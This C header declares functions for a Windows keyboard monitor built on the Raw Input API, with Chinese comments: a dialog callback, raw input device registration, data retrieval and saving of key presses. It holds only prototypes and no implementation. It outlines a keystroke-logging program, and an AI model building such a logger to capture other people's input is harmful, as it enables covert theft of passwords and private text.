#pragma once
#include <stdio.h>
#include <windows.h>


BOOL CALLBACK KeyMainDlg(HWND hWnd, UINT uiMsg, WPARAM wParam, LPARAM lParam);//键盘按键输入监控回调函数
BOOL KeyInputInit(HWND hWnd);//注册原始输入设备
BOOL KeyInputGetData(LPARAM lParam);//获取原始输入数据
void KeyInputSaveKey(USHORT usVKey);//保存按键信息